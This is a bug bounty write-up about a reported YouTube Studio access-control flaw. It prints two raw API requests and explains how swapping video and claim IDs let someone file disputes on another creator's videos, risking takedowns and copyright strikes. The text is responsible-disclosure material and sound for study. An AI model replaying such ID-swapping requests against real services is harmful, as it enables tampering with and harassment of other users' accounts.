---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-29_a-creative-way-to-get-someones-youtube-videos-deleted-a-copyright-strike-against.md
original_filename: 2024-07-29_a-creative-way-to-get-someones-youtube-videos-deleted-a-copyright-strike-against.md
title: A Creative Way To Get Someones YouTube Videos Deleted + A Copyright Strike
  Against Their YouTube Channel
category: documents
detected_topics:
- access-control
- api-security
- idor
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- access-control
- api-security
- idor
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: 77a633b683f5f7e73e725ff866bb280e29dfa0ddb4c59ebc299fbd42f7719059
text_sha256: 8d2f4ab2822bc842ba0235ea021db4ac4409c3f2e008bb0f542bec1c721490a0
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# A Creative Way To Get Someones YouTube Videos Deleted + A Copyright Strike Against Their YouTube Channel

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-29_a-creative-way-to-get-someones-youtube-videos-deleted-a-copyright-strike-against.md
- Source Type: markdown
- Detected Topics: access-control, api-security, idor, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `77a633b683f5f7e73e725ff866bb280e29dfa0ddb4c59ebc299fbd42f7719059`
- Text SHA256: `8d2f4ab2822bc842ba0235ea021db4ac4409c3f2e008bb0f542bec1c721490a0`


## Content

---
title: "A Creative Way To Get Someones YouTube Videos Deleted + A Copyright Strike Against Their YouTube Channel"
url: "https://secreltyhiddenwriteups.blogspot.com/2024/07/a-creative-way-to-get-someones-youtube.html"
final_url: "https://secreltyhiddenwriteups.blogspot.com/2024/07/a-creative-way-to-get-someones-youtube.html"
authors: ["Cam (@SecretlyHidden1)"]
programs: ["Google (Youtube)"]
bugs: ["IDOR", "Broken Access Control"]
publication_date: "2024-07-29"
added_date: "2024-07-30"
source: "pentester.land/writeups.json"
original_index: 126
---

###  A Creative Way To Get Someones YouTube Videos Deleted + A Copyright Strike Against Their YouTube Channel 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

\-  [ July 29, 2024  ](https://secreltyhiddenwriteups.blogspot.com/2024/07/a-creative-way-to-get-someones-youtube.html "permanent link")

Hey All! Welcome back to another blog post of a pretty interesting finding I submitted to Google. Since the last post got such good traction I will probably be posting another one this weekend or next week. Not sure what that type of write up will entail. 

If you read the last post you probably saw how you could utilize a API in Google Classroom to leak other users Google Drive files. Google gave a nice bounty for it and fixed it very quickly. The traction that post received was amazing as well so thank you for that. 

In this post I am going to show you a very interesting finding which could have resulted in you being able to delete another persons YouTube videos and even risk their entire channel getting deleted. 

So lets begin!

First a little bit of background on YouTube and copyright disputes. 

I think most here know YouTube has a copyright process where if you upload a video using another persons music for example a content ID claim is put against your video. Now these are generally harmless and may result in ads appearing on your video for example so the true owner of the material can make some money from it etc.

Lets say a content ID claim is put against your video and you actually own the material in the video. YouTube also has a very nice dispute process you can do. Here is a image they have to show this process:

![](https://storage.googleapis.com/support-kms-prod/7jGpcFjsZlB21XObsanSOa6NlH36siHN543n)

This is a pretty awesome diagram Google provides to show the dispute process. So if you dispute a content ID claim against a YouTube video you uploaded the owner of the actual content gets notified and has a few actions they can perform. If the owner thinks your dispute claim is invalid this is what they can do:

[What the claimant can do  
](https://support.google.com/youtube/answer/2797454?hl=en&co=GENIE.Platform%3DAndroid#zippy=%2Cwhat-the-claimant-can-do)

  * **Release the claim:** If the claimant agrees with your dispute, they can release their claim. If you were previously monetizing the video, your monetization settings will be restored automatically when all claims on your video are released. Learn more about [monetization during Content ID disputes](https://support.google.com/youtube/answer/7000961).
  * **Reinstate the claim:** If the claimant believes that their claim is still valid, they can reinstate it. This means that your dispute was rejected and the claim stays on your video. You may be eligible to [appeal this decision](https://support.google.com/youtube/answer/12104471).
  * **Submit a takedown request** : If the claimant believes that their claim is still valid, they can submit a [copyright takedown request](https://support.google.com/youtube/answer/2807622). If the takedown request is [valid](https://support.google.com/youtube/answer/2807622#after), your video is removed from YouTube and your channel gets a [copyright strike](https://support.google.com/youtube/answer/2814000). Learn more about options for [resolving a copyright strike](https://support.google.com/youtube/answer/2814000#resolve).
  * **Let the claim expire** : If the claimant doesn’t respond within 30 days, the claim on your video will expire and be released from your video.

As you can see in the above if you submit a dispute the owner of the material could actually submit an entire take down request of your video which then also results in you getting a copyright strike against your channel. For those that do not know a copy right strike on a YouTube channel is pretty serious. Your channel is at risk for entire deletion. 

  

The finding:

  

This particular night when I was doing my research I was testing the YouTube Content Studio here:

https://studio.youtube.com

I was mainly just testing all the different API endpoints to see if anything had missing access control checks. Now the good news is when testing the API to delete someone else's YouTube video I got a access denied error so all was good on that front. 

Now I was wondering if I cant directly delete someones YouTube video or channel what else can I do. How can I bypass this?

Well during my research I ended up finding this API endpoint after I uploaded a video a while ago that had a content ID claim against it:

POST /youtubei/v1/creator/list_creator_received_claims?alt=json&key=AIzaSyBUPetSUmoZL-OhlxA7wSac5XinrygCqMo HTTP/1.1  
Host: [studio.youtube.com](http://studio.youtube.com)

{"context":{"client":{"clientName":62,"clientVersion":"1.20200105.0.0","hl":"en","gl":"US","experimentsToken":""},"request":{"returnLogEntry":true,"internalExperimentFlags":[{"key":"force_route_innertube_shopping_settings_to_outertube","value":"true"},{"key":"force_live_chat_merchandise_upsell","value":"false"},{"key":"force_route_delete_playlist_to_outertube","value":"false"}]},"clientScreenNonce":"MC41MTczMTA1ODY2MDI3NzMy"},"videoId":"n6c0nOScCCo","criticalRead":false}

In the above request it lists the content ID claims you have received against a video you own. In the bottom you should see this:

"videoId":"n6c0nOScCCo"

If you replaced the video ID with any other video you could see the content ID claims placed against that video. So this API did not have proper access control checks and allowed you to leak the content ID claims against anyone's videos for example. 

Now when I did this I noticed that I received the claimID in the response. I then wondered how useful knowing the claimID would be. 

I then found this next request when investigating:

POST /youtubei/v1/copyright/submit_claim_dispute?alt=json&key=AIzaSyBUPetSUmoZL-OhlxA7wSac5XinrygCqMo HTTP/1.1  
Host: [studio.youtube.com](http://studio.youtube.com)

{"claimId":{"claimId":"UK9o_XrpTyM","videoId":"n6c0nOScCCo"},"claimDisputeReason":"CLAIM_DISPUTE_REASON_FAIR_USE","fairUseType":"FAIR_USE_TYPE_PROMOTIONAL","justification":"test","signature":"test","channelId":"UCB1Z_cpKu-5V4ag30cndODQ","context":{"client":{"clientName":62,"clientVersion":"1.20200105.0.0","hl":"en","gl":"US","experimentsToken":""},"request":{"returnLogEntry":true,"internalExperimentFlags":[{"key":"force_route_innertube_shopping_settings_to_outertube","value":"true"},{"key":"force_live_chat_merchandise_upsell","value":"false"},{"key":"force_route_delete_playlist_to_outertube","value":"false"}]},"clientScreenNonce":"MC41MTczMTA1ODY2MDI3NzMy"}}

If you look at this next above request you should see:

{"claimId":{"claimId":"UK9o_XrpTyM","videoId":"n6c0nOScCCo"},"claimDisputeReason":"CLAIM_DISPUTE_REASON_FAIR_USE",

Well I just leaked the claimID for the video in the first request. So now all you need to do is change the claimID to the ID you leaked and the videoID for the video you are targeting.

You now will have fully opened and filed a fake content claim dispute on someone else's entire video. If you then remember the image above the true owner could completely file a response to have your entire video taken down along with a copyright strike. 

So while this did not result in a direct deletion of anyone's YouTube videos this was a creative way that could have done it. 

Here is a video POC:

Once again Google VRP likes music with their videos so please enjoy that as well :)  
  

  

  

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

#### Post a Comment

[](https://www.blogger.com/comment/frame/8894024976105685401?po=1539737532200003957&hl=en&saa=85391&origin=https://secreltyhiddenwriteups.blogspot.com&skin=contempo)
